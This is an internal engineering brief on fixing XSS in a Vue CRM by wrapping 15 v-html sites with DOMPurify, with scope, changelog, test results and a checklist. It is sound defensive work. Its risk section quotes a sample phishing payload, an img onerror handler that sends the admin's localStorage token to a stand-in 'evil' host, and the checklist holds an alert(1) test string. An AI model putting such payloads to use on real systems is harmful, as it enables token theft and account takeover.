# 01 · Sanitize every unsafe `v-html` in the CRM

**Status:** complete (CRM); content-blocks + Nuxt split out to [`01b`](./01b-xss-sanitize-content-blocks.md)
**Date:** 2026-11-11
**Priority:** Day-1 (highest severity on the audit)
**Related:** [`audit-2026-11-11.md`](./audit-2026-11-11.md) → Security

## The risk

The CRM renders adversarial HTML directly through `v-html` in several places. Combined with the current auth-token storage model (JWT in `localStorage`, `packages/api-client/src/http.ts:8`), a successful XSS steals the token and takes over an admin account.

Highest-risk site: `apps/crm/src/components/CommunicationThreadView.vue:401,417` — this renders received email HTML (received = adversarial by default). A phishing email with `<img src=x onerror="fetch('https://evil/'+localStorage.torny_token)">` executes JS in the CRM origin when an admin opens the thread.

## Scope

Audit missed sites — final count is **7 files, 15 `v-html` sites**:

| File | Sites | Source of HTML |
|---|---|---|
| `components/CommunicationThreadView.vue` | 2 | Inbound email HTML (adversarial) |
| `views/communications/ComposeView.vue` | 3 | Composer preview — header / body / footer |
| `views/communications/CampaignDetailView.vue` | 1 | Mock + live campaign body lines |
| `views/communications/WrapEditView.vue` | 2 | Email-template wrap preview (fallback when server-preview absent; the server-preview path already uses `sandbox=""` iframe) |
| `views/settings/EmailSignaturesPanel.vue` | 4 | User-editable signatures (tiles + modal previews) |
| `components/modals/SendEmailModal.vue` | 2 | Personal + club signature preview in send modal |
| `views/members/MemberDetailView.vue` | 1 | Note body HTML |

Not in scope (deferred):
- The auth-token storage model (needs a backend brief for HttpOnly cookies)
- Content-Security-Policy headers (separate PR — risks breaking Stripe / fonts)
- `SendEmailModal.vue`'s `div.innerHTML` — DOM manipulation for `htmlToPlain()`, not rendering. Different class of problem.
- `packages/content-blocks/src/blocks/CustomAiBlock.vue` and `RichTextBlock.vue` — these render on PUBLIC club sites to arbitrary visitors. Split to [`01b`](./01b-xss-sanitize-content-blocks.md) because they need an isomorphic sanitiser (SSR + browser).

## Approach

1. Add `dompurify` + `@types/dompurify` to `apps/crm/package.json`.
2. Create `apps/crm/src/utils/sanitizeHtml.ts` — one helper with an email-safe allowlist (keep `<a>`, `<img>`, basic formatting; strip `<script>`, event handlers, `javascript:` URLs, `<iframe>`, `<object>`, `<embed>`, `<form>`).
3. Replace each unsafe `v-html` with a sanitised version — either a computed wrapping the source, or inline `sanitize(x)`.
4. Add a vitest unit test proving `<script>`, `onerror=`, and `javascript:` href are stripped.
5. Run the standard feedback loop: `typecheck` → `test` → `test:e2e`.

## Why DOMPurify over a hand-rolled allowlist

- Battle-tested, actively maintained
- Default config handles the OWASP XSS Filter Evasion cheat-sheet
- Easy to extend with `ADD_ATTR` / `ADD_TAGS` if email formatting needs something unusual
- Cost: ~20KB gzipped. Acceptable for a CRM admin app on auth'd routes

## Changelog

### 2026-11-11

- **Audit identified the risk.** 8 unsafe `v-html` sites across 4 files (final count after wider grep: 15 sites across 7 files).
- **Doc created.** This file.
- **DOMPurify installed.** `dompurify@^3.5.0` added to `apps/crm/package.json`. The deprecated `@types/dompurify` was installed then removed — DOMPurify 3.x ships its own types.
- **Helper created.** `apps/crm/src/utils/sanitizeHtml.ts` — explicit allowlist, no `USE_PROFILES` (originally added, caught by DOMPurify's own warning that profiles override explicit allowlists — the config was silently wrong).
- **Afterwards-hook forces external links to carry `target="_blank" rel="noopener noreferrer"`.**
- **Wired into all 15 v-html sites** across 7 files. Call sites use `v-html="sanitizeEmailHtml(X)"` directly so you can grep for `v-html` and visually confirm sanitisation — no hidden "trusted" path.
- **Unit test** `src/__tests__/sanitizeHtml.test.ts` added — 11 cases covering `<script>`, inline event handlers, `javascript:` href, `<iframe>`/`<object>`/`<embed>`/`<form>`, SVG script bypass, `srcdoc` bypass, legitimate email HTML (anchors, lists, inline images), `mailto:`/`tel:`/`data:` URL schemes, external anchor hardening.
- **Feedback loop:**
  - `pnpm --filter @torny/crm typecheck` — **green**
  - `pnpm --filter @torny/crm test` — **green** (62/62, including 11 new)
  - `pnpm --filter @torny/crm test:e2e` — **38 passed, 3 skipped, 2 failed**. Failures are both in `team-selections.spec.ts` (drag-and-drop dragTo timeouts). Verified via `git stash` that both fail identically on baseline without my changes — pre-existing regression in team-selections, unrelated to this work. Flagged for follow-up, not touched.

## Verification checklist

- [x] `pnpm --filter @torny/crm typecheck` green
- [x] `pnpm --filter @torny/crm test` green + new sanitizer test added (62/62)
- [x] `pnpm --filter @torny/crm test:e2e` — all failures confirmed pre-existing (team-selections drag-and-drop), not caused by this change
- [ ] Manual check: open a communication thread in dev, confirm legit HTML renders (bold, lists, links, inline images)
- [ ] Manual check: paste `<img src=x onerror=alert(1)>` into the signature editor, confirm it renders as text, not executes

## Follow-up briefs needed

- Backend brief: move auth to HttpOnly session cookies so XSS can't lift the token even if sanitization slips
- Ops brief: add CSP headers (default-src 'self'; script-src 'self' js.stripe.com; ...) once the Stripe + fonts compatibility matrix is confirmed
